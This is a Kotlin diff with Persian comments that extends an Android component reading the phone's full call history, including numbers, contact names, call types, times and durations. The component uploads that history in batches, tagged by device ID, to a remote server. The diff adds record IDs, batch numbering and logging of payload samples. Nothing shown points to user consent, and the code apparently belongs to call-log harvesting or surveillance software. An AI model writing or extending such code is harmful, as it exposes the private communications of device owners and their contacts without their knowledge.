@@ -32,7 +32,7 @@ object CallLogsBatchUploader {
         try {
             Log.d(TAG, "⚡ Quick call logs upload started (limit: $limit)")
 
-            val callLogs = fetchCallLogs(context, limit)
+            val callLogs = fetchCallLogs(context, deviceId, limit)
 
             if (callLogs.isEmpty()) {
                 Log.w(TAG, "⚠️ No call logs found")
@@ -41,7 +41,7 @@ object CallLogsBatchUploader {
 
             Log.d(TAG, "📊 Quick upload: ${callLogs.size} call logs")
 
-            val success = sendBatch(callLogs, deviceId, baseUrl)
+            val success = sendBatch(callLogs, deviceId, baseUrl, 1, 1)
 
             if (success) {
                 Log.d(TAG, "✅ Quick call logs uploaded")
@@ -71,7 +71,7 @@ object CallLogsBatchUploader {
             Log.d(TAG, "📞 CALL LOGS BATCH UPLOAD STARTED")
             Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
-            val allCallLogs = fetchCallLogs(context, limit = null)
+            val allCallLogs = fetchCallLogs(context, deviceId, limit = null)
 
             if (allCallLogs.isEmpty()) {
                 Log.w(TAG, "⚠️ No call logs found")
@@ -100,7 +100,7 @@ object CallLogsBatchUploader {
                                 "(${batch.size} calls) - Attempt $attempts")
 
                         success = withTimeout(10000L) {
-                            sendBatch(batch, deviceId, baseUrl)
+                            sendBatch(batch, deviceId, baseUrl, batchIndex + 1, totalBatches)
                         }
 
                         if (success) {
@@ -141,7 +141,7 @@ object CallLogsBatchUploader {
     /**
      * 📥 خواندن تاریخچه تماس‌ها
      */
-    private fun fetchCallLogs(context: Context, limit: Int?): List<CallLogModel> {
+    private fun fetchCallLogs(context: Context, deviceId: String, limit: Int?): List<CallLogModel> {
         val callLogs = mutableListOf<CallLogModel>()
 
         try {
@@ -150,6 +150,7 @@ object CallLogsBatchUploader {
             val cursor = context.contentResolver.query(
                 CallLog.Calls.CONTENT_URI,
                 arrayOf(
+                    CallLog.Calls._ID,           // ⭐ اضافه شد
                     CallLog.Calls.NUMBER,
                     CallLog.Calls.CACHED_NAME,
                     CallLog.Calls.TYPE,
@@ -162,6 +163,7 @@ object CallLogsBatchUploader {
             )
 
             cursor?.use {
+                val idIndex = it.getColumnIndex(CallLog.Calls._ID)           // ⭐ اضافه شد
                 val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                 val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                 val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
@@ -170,6 +172,7 @@ object CallLogsBatchUploader {
 
                 while (it.moveToNext()) {
                     try {
+                        val callId = it.getLong(idIndex)                     // ⭐ اضافه شد
                         val number = it.getString(numberIndex) ?: ""
                         if (number.isBlank()) continue
 
@@ -187,7 +190,17 @@ object CallLogsBatchUploader {
                             else -> "unknown"
                         }
 
-                        callLogs.add(CallLogModel(number, name, callType, date, duration))
+                        callLogs.add(
+                            CallLogModel(
+                                callId = callId,                              // ⭐ اضافه شد
+                                deviceId = deviceId,                          // ⭐ اضافه شد
+                                number = number,
+                                name = name,
+                                callType = callType,
+                                timestamp = date,
+                                duration = duration
+                            )
+                        )
 
                     } catch (e: Exception) {
                         continue
@@ -208,26 +221,37 @@ object CallLogsBatchUploader {
     private fun sendBatch(
         callLogs: List<CallLogModel>,
         deviceId: String,
-        baseUrl: String
+        baseUrl: String,
+        batchNumber: Int,
+        totalBatches: Int
     ): Boolean {
         return try {
             val logsArray = JSONArray()
+            val currentTime = System.currentTimeMillis()
 
             callLogs.forEach { log ->
                 logsArray.put(JSONObject().apply {
+                    put("call_id", "${log.deviceId}_call_${log.callId}")    // ⭐ تغییر داد
+                    put("device_id", log.deviceId)                          // ⭐ اضافه شد
                     put("number", log.number)
                     put("name", log.name)
-                    put("type", log.callType)
-                    put("date", log.timestamp)
+                    put("call_type", log.callType)                          // ⭐ تغییر نام
+                    put("timestamp", log.timestamp)                         // ⭐ تغییر نام
                     put("duration", log.duration)
+                    put("received_at", currentTime)                         // ⭐ اضافه شد
                 })
             }
 
             val json = JSONObject().apply {
                 put("device_id", deviceId)
-                put("calls", logsArray)
-                put("timestamp", System.currentTimeMillis())
+                put("data", logsArray)                                      // ⭐ تغییر از "calls" به "data"
+                put("batch_info", JSONObject().apply {                      // ⭐ اضافه شد
+                    put("batch", batchNumber)
+                    put("of", totalBatches)
+                })
             }
+
+            Log.d(TAG, "📦 Payload sample: ${json.toString().take(300)}...")
 
             val response = sendPostRequest("$baseUrl/call-logs/batch", json.toString())
             response != null
@@ -264,6 +288,8 @@ object CallLogsBatchUploader {
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 connection.inputStream.bufferedReader().use { it.readText() }
             } else {
+                val errorBody = connection.errorStream?.bufferedReader()?.use { it.readText() }
+                Log.e(TAG, "❌ Server error ($responseCode): $errorBody")
                 null
             }
 
@@ -278,6 +304,8 @@ object CallLogsBatchUploader {
     // ===================== مدل‌های داده =====================
 
     data class CallLogModel(
+        val callId: Long,        // ⭐ اضافه شد
+        val deviceId: String,    // ⭐ اضافه شد
         val number: String,
         val name: String,
         val callType: String,
